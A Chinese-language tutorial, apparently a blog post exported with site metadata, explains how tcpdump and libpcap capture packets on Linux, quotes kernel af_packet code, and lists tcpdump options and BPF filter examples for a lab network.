src=\"/images/tcpdump/793dd841e89e5eb113c041860dfeea234153cfa4.png\" alt=\"793dd841e89e5eb113c041860dfeea234153cfa4\"></p>\n<p>此时通过<code>libpcap库</code>来实现的，tcpdump调用libpcap的api函数，由libpcap进入到内核态到链路层来抓包,如下图：</p>\n<p>BPF是过滤器，可以根据用户设置用于数据包过滤减少应用程序的数据包的包数和字节数从而提高性能。</p>\n<p>BufferQ是缓存供应用程序读取的数据包；可以说tcpdump底层原理其实就是libpcap的实现原理。</p>\n<p><img src=\"/images/tcpdump/bc8a1dd22a5130474a0fa6945089fa2a4ccda680.png\" alt=\"bc8a1dd22a5130474a0fa6945089fa2a4ccda680\"></p>\n<p>而libpcap在linux系统链路层中抓包是通过PF_PACKET套接字来实现的(不同的系统其实现机制是由差异的)，该方法在创建的时候，可以指定第二参数为SOCK_DGRAM或者SOCK_RAW，影响是否扣除链路层的首部。</p>\n<p>libpcap在内核收发包的接口处将skb_clone()拿走的包。</p>\n<h4 id=\"libpcap\"><a href=\"#libpcap\" class=\"headerlink\" title=\"libpcap\"></a>libpcap</h4><p>最早的编译系统和过滤引擎是在tcpdump项目中的，后来为了编译其他抓包的应用，将其独立出来。现在libpcap提供独立于平台的库和API，来满足执行网络嗅探。</p>\n<p>tcpdump.c正式使用libpcap里的函数完成两个最关键的动作：获取捕获报文的接口，和捕获报文并将报文交给callback。</p>\n<p>libpcap支持“伯克利包过滤（BPF）”语法。BPF能够通过比较第2、3、4层协议中各个数据字段值的方法对流量进行过滤。Libpcap的使用逻辑如下图:</p>\n<p><img src=\"/images/tcpdump/9fc92b7b41bb8d51fcb471f76ce6c3be3f564e2a.png\" alt=\"9fc92b7b41bb8d51fcb471f76ce6c3be3f564e2a\"></p>\n<h5 id=\"libpcap函数\"><a href=\"#libpcap函数\" class=\"headerlink\" title=\"libpcap函数\"></a>libpcap函数</h5><p>函数分类：<a href=\"https://yq.aliyun.com/go/articleRenderRedirect?spm=a2c4e.11153940.0.0.4532acc0MF0CgG&url=http://www.tcpdump.org/manpages/pcap.3pcap.html\">tcpdmp_pcap官方</a></p>\n<p>1、读包打开句柄</p>\n<p>2、抓包选择链路层</p>\n<p>3、抓包函数</p>\n<p>4、过滤器</p>\n<p>5、选定抓包方向（进还是出）</p>\n<p>6、抓统计信息</p>\n<p>7、将包写入文件打开句柄</p>\n<p>8、写包</p>\n<p>9、注入包</p>\n<p>10、报告错误</p>\n<p>11、获取库版本信息</p>\n<h5 id=\"常见函数\"><a href=\"#常见函数\" class=\"headerlink\" title=\"常见函数\"></a>常见函数</h5><ul>\n<li>pcap_lookupdev      如果分组捕获设备未曾指定(-i命令行选项)，该函数选择一个设备。</li>\n<li>pcap_open_offine    打开一个保存的文件。</li>\n<li>pcap_setfilter            设置过滤器</li>\n<li>pcap_open_live         打开选择的设备。</li>\n<li>pcap_next                   接收一个包</li>\n<li>pcap_dump                将包写入到pcap_dump_t结构体</li>\n<li>pcap_loopupnet        返回分组捕获设备的网络地址和子网掩码，然后在调用pcap_compile时必须指定这个子网掩码。</li>\n<li>pcap_compile             把cmd字符数组中构造的过滤器字符串编译成一个过滤器程序，存放在fcode中。</li>\n<li>pcap_setfilter              把编译出来的过滤器程序装载到分组捕获设备，同时引发用该过滤器选取的分组的捕获。</li>\n<li>pcap_datalink              返回分组捕获设备的数据链路类型。</li>\n</ul>\n<h4 id=\"协议注册\"><a href=\"#协议注册\" class=\"headerlink\" title=\"协议注册\"></a>协议注册</h4><p>对于以上介绍的协议，也只有在需要的时候才会注册，因为它毕竟增加了系统报文的处理速度并且会消耗大量的系统skb。当抓包开始的时候，它会创建一个对应的网络套接口，这种套接口的类型就是<code>af_packet</code>类型。相关实现参考C源码：<a href=\"http://lxr.linux.no/linux+v3.4/net/packet/af_packet.c\">af_packet.c</a>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">packet_create</span><span class=\"params\">(struct socket *sock, <span class=\"keyword\">int</span> protocol)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock</span> *<span class=\"title\">sk</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">packet_opt</span> *<span class=\"title\">po</span>;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> err;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!capable(CAP_NET_RAW))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> -EPERM;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sock-&gt;type != SOCK_DGRAM &amp;&amp; sock-&gt;type != SOCK_RAW</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_SOCK_PACKET</span></span><br><span class=\"line\">     &amp;&amp; sock-&gt;type != SOCK_PACKET</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">     )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> -ESOCKTNOSUPPORT;</span><br><span class=\"line\">    sock-&gt;state = SS_UNCONNECTED;</span><br><span class=\"line\">    err = -ENOBUFS;</span><br><span class=\"line\">    sk = sk_alloc(PF_PACKET, GFP_KERNEL, <span class=\"number\">1</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sk == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    sock-&gt;ops = &amp;packet_ops;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_SOCK_PACKET</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sock-&gt;type == SOCK_PACKET)</span><br><span class=\"line\">        sock-&gt;ops = &amp;packet_ops_spkt;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">    sock_init_data(sock,sk);</span><br><span class=\"line\">    sk_set_owner(sk, THIS_MODULE);</span><br><span class=\"line\"></span><br><span class=\"line\">    po = sk-&gt;sk_protinfo = kmalloc(<span class=\"keyword\">sizeof</span>(*po), GFP_KERNEL);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!po)</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out_free;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(po, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(*po));</span><br><span class=\"line\">    sk-&gt;sk_family = PF_PACKET;</span><br><span class=\"line\">    po-&gt;num = protocol;</span><br><span class=\"line\"></span><br><span class=\"line\">    sk-&gt;sk_destruct = packet_sock_destruct;</span><br><span class=\"line\">    atomic_inc(&amp;packet_socks_nr);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     *    Attach a protocol block</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    spin_lock_init(&amp;po-&gt;bind_lock);</span><br><span class=\"line\">    po-&gt;prot_hook.func = packet_rcv;       ----- 这个地方挂接处理函数，注册为packet_rcv。</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_SOCK_PACKET</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sock-&gt;type == SOCK_PACKET)</span><br><span class=\"line\">        po-&gt;prot_hook.func = packet_rcv_spkt;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">    po-&gt;prot_hook.af_packet_priv = sk;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (protocol) &#123;</span><br><span class=\"line\">        po-&gt;prot_hook.type = protocol;</span><br><span class=\"line\">        dev_add_pack(&amp;po-&gt;prot_hook);      ----- dev_add_pack将协议加入到ptype_all链表中，具体参考下面函数代码</span><br><span class=\"line\">        sock_hold(sk);</span><br><span class=\"line\">        po-&gt;running = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    write_lock_bh(&amp;packet_sklist_lock);</span><br><span class=\"line\">    sk_add_node(sk, &amp;packet_sklist);</span><br><span class=\"line\">    write_unlock_bh(&amp;packet_sklist_lock);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">out_free:</span><br><span class=\"line\">    sk_free(sk);</span><br><span class=\"line\">out:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> err;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Options\"><a href=\"#Options\" class=\"headerlink\" title=\"Options\"></a>Options</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> tcpdump -n -vvvv -i ens33 host 172.16.144.141 and port 80 -w web.pcap</span></span><br><span class=\"line\"></span><br><span class=\"line\">-n：不转换主机名、端口号（开启后看到的是IP地址，而不是主机名，实际使用中我们一般都比较关注服务器IP地址）</span><br><span class=\"line\">-v：显示详细信息，v越多信息越多</span><br><span class=\"line\">-i：指定网络接口，也就网卡的名字，常用的有eth0,eth1等，如果要监听所有网卡就是用-i any。</span><br><span class=\"line\">-w：抓取的包写入到文件，方便后续分析。实际中经常使用tcpdump抓包保存，然后使用Wireshark分析</span><br><span class=\"line\">-r：抓到的包也可以tcpdump打开再分析，tcpdump -n -vvvv -r data.cap</span><br><span class=\"line\">-c：指定抓取的包的数目</span><br><span class=\"line\">-s：指定抓取的数据的长度</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tcpdump/image-20200716175428104.png\" alt=\"image-20200716175428104\"></p>\n<p>Wireshark打开</p>\n<p><img src=\"/images/tcpdump/image-20200716184023410.png\" alt=\"image-20200716184023410\"></p>\n<h4 id=\"常见命令\"><a href=\"#常见命令\" class=\"headerlink\" title=\"常见命令\"></a>常见命令</h4><p>这部分简单演示了tcpdump的使用，如需常见语法可直接查看<code>基本语法</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"string\">&quot;GET&quot;</span>的十六进制是 47455420</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 监听对本地进行GET请求数据包</span></span><br><span class=\"line\">tcpdump -i ens33 &#x27;tcp[(tcp[12]&gt;&gt;2):4] = 0x47455420&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tcpdump/image-20200716185547770.png\" alt=\"image-20200716185547770\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"string\">&quot;SSH-&quot;</span>的十六进制是 0x5353482D</span></span><br><span class=\"line\">tcpdump -i ens33 &#x27;tcp[(tcp[12]&gt;&gt;2):4] = 0x5353482D&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tcpdump/image-20200716184806562.png\" alt=\"image-20200716184806562\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 截获DNS请求数据</span></span><br><span class=\"line\">tcpdump -i ens33 udp dst port 53</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 截获大于600字节</span></span><br><span class=\"line\">tcpdump -i ens33 &#x27;ip[2:2] &gt; 600&#x27;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"过滤器\"><a href=\"#过滤器\" class=\"headerlink\" title=\"过滤器\"></a>过滤器</h4><ul>\n<li><p>过滤器的关键词有：host、port、 net、src、 dst、icmp、tcp、udp、http</p>\n</li>\n<li><p>逻辑关键词：and、or、not</p>\n</li>\n<li><p>包头过滤</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp[tcpflags] &amp; tcp-syn != 0 and tcp[tcpflags] &amp; tcp-ack != 0</span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<h4 id=\"数据分析\"><a href=\"#数据分析\" class=\"headerlink\" title=\"数据分析\"></a>数据分析</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes</span><br><span class=\"line\">21:45:10.830435 IP (tos 0x0, ttl 64, id 63824, offset 0, flags [DF], proto TCP (6), length 60)</span><br><span class=\"line\">    18:54:59.000951 IP 172.16.144.1.64074 &gt; 172.16.144.141.http: Flags [P.], seq 352511301:352511594, ack 1460171085, win 4117, options [nop,nop,TS val 872905073 ecr 10965627], length 293: HTTP: GET /robots.txt HTTP/1.1</span><br></pre></td></tr></table></figure>\n\n<p><code>172.16.144.1.64074 &gt; 172.16.144.141.http</code> 这里源地址(<code>172.16.144.1.64074</code>)到目的地址(<code>172.16.144.141.http</code>)</p>\n<p><code>Flags [S]</code>是包的标志，<code>[S]</code>表示是<code>SYC</code>:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[S] – SYN (开始连接)</span><br><span class=\"line\">[.] – 没有标记 (一般是确认)</span><br><span class=\"line\">[P] – PSH (数据推送)</span><br><span class=\"line\">[F] – FIN (结束连接)</span><br><span class=\"line\">[R] – RST (重启连接)</span><br></pre></td></tr></table></figure>\n\n<p>为了提高网络效率，一个包也可以包含标志的组合，比如<code>[S.]</code>，<code>[FP.]</code></p>\n<ul>\n<li><code>seq</code>：同步序列编号，Synchronize Sequence Numbers；</li>\n<li><code>ack</code>：确认编号，Acknowledgement Number；</li>\n<li><code>win</code>：滑动窗口大小</li>\n<li><code>length</code>：承载的数据(payload)长度length，如果没有数据则为0</li>\n</ul>\n<p><img src=\"/images/tcpdump/1760830-e18fbb8480375fcd.jpeg\" alt=\"1760830-e18fbb8480375fcd\"></p>\n<h4 id=\"基本语法\"><a href=\"#基本语法\" class=\"headerlink\" title=\"基本语法\"></a>基本语法</h4><h5 id=\"1-过滤主机\"><a href=\"#1-过滤主机\" class=\"headerlink\" title=\"1.过滤主机\"></a>1.过滤主机</h5><p>抓取所有经过ens33，目的或源地址是172.16.144.141的网络数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 host 172.16.144.141</span><br></pre></td></tr></table></figure>\n\n<p>指定源地址</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 src host 172.16.144.141</span><br></pre></td></tr></table></figure>\n\n<p>指定目的地址</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 dst host 172.16.144.1</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-过滤端口\"><a href=\"#2-过滤端口\" class=\"headerlink\" title=\"2.过滤端口\"></a>2.过滤端口</h5><p>抓取所有经过ens33，目的或源端口是80的网络数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 port 80</span><br></pre></td></tr></table></figure>\n\n<p>指定源端口</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 src port 80</span><br></pre></td></tr></table></figure>\n\n<p>指定目的端口</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 dst port 80</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"3-网络过滤\"><a href=\"#3-网络过滤\" class=\"headerlink\" title=\"3.网络过滤\"></a>3.网络过滤</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 net 172.16</span><br><span class=\"line\">tcpdump -i ens33 src net 172.16</span><br><span class=\"line\">tcpdump -i ens33 dst net 172.16</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-协议过滤\"><a href=\"#4-协议过滤\" class=\"headerlink\" title=\"4.协议过滤\"></a>4.协议过滤</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 arp</span><br><span class=\"line\">tcpdump -i ens33 ip</span><br><span class=\"line\">tcpdump -i eth1 tcp</span><br><span class=\"line\">tcpdump -i eth1 udp</span><br><span class=\"line\">tcpdump -i eth1 icmp</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-表达式\"><a href=\"#5-表达式\" class=\"headerlink\" title=\"5.表达式\"></a>5.表达式</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">非 : ! or &quot;not&quot; (去掉双引号)  </span><br><span class=\"line\">且 : &amp;&amp; or &quot;and&quot;  </span><br><span class=\"line\">或 : || or &quot;or&quot;</span><br></pre></td></tr></table></figure>\n\n<p>抓取所有经过ens33，目的地址是172.16.144.141或172.16.141.1端口是80的TCP数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 &#x27;((tcp) and (port 80) and ((dst host 172.16.144.141) or (dst host 172.16.141.1)))&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>抓取所有经过ens33，目标MAC地址是00:0c:29:aa:b2:93的ICMP数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 &#x27;((icmp) and ((ether dst host 00:0c:29:aa:b2:93)))&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>抓取所有经过ens33，目的ip是172.16，但目的主机不是172.16.144.1的TCP数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 &#x27;((tcp) and ((dst net 172.16) and (not dst host 172.16.144.141)))&#x27;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"6-运维\"><a href=\"#6-运维\" class=\"headerlink\" title=\"6.运维\"></a>6.运维</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -s 0 -w filename</span><br><span class=\"line\">-s 0是抓取完整数据包，否则默认只抓68字节</span><br></pre></td></tr></table></figure>\n\n<p><code>-c</code>参数对于运维人员来说也比较常用，因为流量比较大的服务器，靠人工CTRL+C还是抓的太多，甚至导致服务器宕机，于是可以用<code>-c</code>参数指定抓多少个包。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -nn -i ens33 &#x27;tcp[tcpflags] = tcp-syn&#x27; -c 10000</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"7-高级\"><a href=\"#7-高级\" class=\"headerlink\" title=\"7.高级\"></a>7.高级</h5><p>高级包头过滤可参考<a href=\"https://linuxwiki.github.io/NetTools/tcpdump.html\">这里</a></p>\n<h4 id=\"常见问题\"><a href=\"#常见问题\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h4><ul>\n<li>如果数据包中出现很多的<code>cksum 0xxxx incorrect</code>错误：是因为操作系统为了提高网络效率不再计算校验码，而是交给网卡计算</li>\n</ul>\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux抓包原理:</span><br><span class=\"line\">https:&#x2F;&#x2F;www.iyunv.com&#x2F;thread-149869-1-1.html</span><br><span class=\"line\">tcpdump源码分析:</span><br><span class=\"line\">https:&#x2F;&#x2F;yq.aliyun.com&#x2F;articles&#x2F;573120</span><br><span class=\"line\">tcpdump语法:</span><br><span class=\"line\">https:&#x2F;&#x2F;linuxwiki.github.io&#x2F;NetTools&#x2F;tcpdump.html</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>tcpdump - dump traffic on a network</p>\n<p>根据使用者的定义对网络上的数据包进行截获的包分析工具。 tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</p>\n<p>tcpdump的报文获取功能是通过libpcap库实现。tcpdump需要root权限才可执行，不然攻击者有普通账户权限就能获取很多信息啊！</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 获取版本信息时会显示libpcap对应版本信息</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> tcpdump --version</span></span><br><span class=\"line\">tcpdump version 4.9.2</span><br><span class=\"line\">libpcap version 1.7.4</span><br><span class=\"line\">OpenSSL 1.0.2g  1 Mar 2016</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>linux下的抓包是通过注册一种虚拟的<code>底层网络协议</code>来完成对网络报文(准确的说是网络设备)消息的处理权。当网卡接收到一个网络报文之后，它会遍历系统中所有已经注册的网络协议，例如以太网协议、x25协议处理模块来尝试进行报文的解析处理，这一点和一些文件系统的挂载相似，就是让系统中所有的已经注册的文件系统来进行尝试挂载，如果哪一个认为自己可以处理，那么就完成挂载。</p>\n<p>当抓包模块把自己伪装成一个网络协议的时候，系统在收到报文的时候就会给这个伪协议一次机会，让它来对网卡收到的报文进行一次处理，此时该模块就会趁机对报文进行窥探，也就是把这个报文完完整整的复制一份，假装是自己接收到的报文，汇报给抓包模块。</p>\n<h4 id=\"如何实现\"><a href=\"#如何实现\" class=\"headerlink\" title=\"如何实现\"></a>如何实现</h4><p>包传递流程：网卡–&gt;内存–&gt;内核态–&gt;用户程序；tcpdump程序运行在用户态，那如何实现从内核态的抓包？</p>\n<p><img src=\"/images/tcpdump/793dd841e89e5eb113c041860dfeea234153cfa4.png\" alt=\"793dd841e89e5eb113c041860dfeea234153cfa4\"></p>\n<p>此时通过<code>libpcap库</code>来实现的，tcpdump调用libpcap的api函数，由libpcap进入到内核态到链路层来抓包,如下图：</p>\n<p>BPF是过滤器，可以根据用户设置用于数据包过滤减少应用程序的数据包的包数和字节数从而提高性能。</p>\n<p>BufferQ是缓存供应用程序读取的数据包；可以说tcpdump底层原理其实就是libpcap的实现原理。</p>\n<p><img src=\"/images/tcpdump/bc8a1dd22a5130474a0fa6945089fa2a4ccda680.png\" alt=\"bc8a1dd22a5130474a0fa6945089fa2a4ccda680\"></p>\n<p>而libpcap在linux系统链路层中抓包是通过PF_PACKET套接字来实现的(不同的系统其实现机制是由差异的)，该方法在创建的时候，可以指定第二参数为SOCK_DGRAM或者SOCK_RAW，影响是否扣除链路层的首部。</p>\n<p>libpcap在内核收发包的接口处将skb_clone()拿走的包。</p>\n<h4 id=\"libpcap\"><a href=\"#libpcap\" class=\"headerlink\" title=\"libpcap\"></a>libpcap</h4><p>最早的编译系统和过滤引擎是在tcpdump项目中的，后来为了编译其他抓包的应用，将其独立出来。现在libpcap提供独立于平台的库和API，来满足执行网络嗅探。</p>\n<p>tcpdump.c正式使用libpcap里的函数完成两个最关键的动作：获取捕获报文的接口，和捕获报文并将报文交给callback。</p>\n<p>libpcap支持“伯克利包过滤（BPF）”语法。BPF能够通过比较第2、3、4层协议中各个数据字段值的方法对流量进行过滤。Libpcap的使用逻辑如下图:</p>\n<p><img src=\"/images/tcpdump/9fc92b7b41bb8d51fcb471f76ce6c3be3f564e2a.png\" alt=\"9fc92b7b41bb8d51fcb471f76ce6c3be3f564e2a\"></p>\n<h5 id=\"libpcap函数\"><a href=\"#libpcap函数\" class=\"headerlink\" title=\"libpcap函数\"></a>libpcap函数</h5><p>函数分类：<a href=\"https://yq.aliyun.com/go/articleRenderRedirect?spm=a2c4e.11153940.0.0.4532acc0MF0CgG&url=http://www.tcpdump.org/manpages/pcap.3pcap.html\">tcpdmp_pcap官方</a></p>\n<p>1、读包打开句柄</p>\n<p>2、抓包选择链路层</p>\n<p>3、抓包函数</p>\n<p>4、过滤器</p>\n<p>5、选定抓包方向（进还是出）</p>\n<p>6、抓统计信息</p>\n<p>7、将包写入文件打开句柄</p>\n<p>8、写包</p>\n<p>9、注入包</p>\n<p>10、报告错误</p>\n<p>11、获取库版本信息</p>\n<h5 id=\"常见函数\"><a href=\"#常见函数\" class=\"headerlink\" title=\"常见函数\"></a>常见函数</h5><ul>\n<li>pcap_lookupdev      如果分组捕获设备未曾指定(-i命令行选项)，该函数选择一个设备。</li>\n<li>pcap_open_offine    打开一个保存的文件。</li>\n<li>pcap_setfilter            设置过滤器</li>\n<li>pcap_open_live         打开选择的设备。</li>\n<li>pcap_next                   接收一个包</li>\n<li>pcap_dump                将包写入到pcap_dump_t结构体</li>\n<li>pcap_loopupnet        返回分组捕获设备的网络地址和子网掩码，然后在调用pcap_compile时必须指定这个子网掩码。</li>\n<li>pcap_compile             把cmd字符数组中构造的过滤器字符串编译成一个过滤器程序，存放在fcode中。</li>\n<li>pcap_setfilter              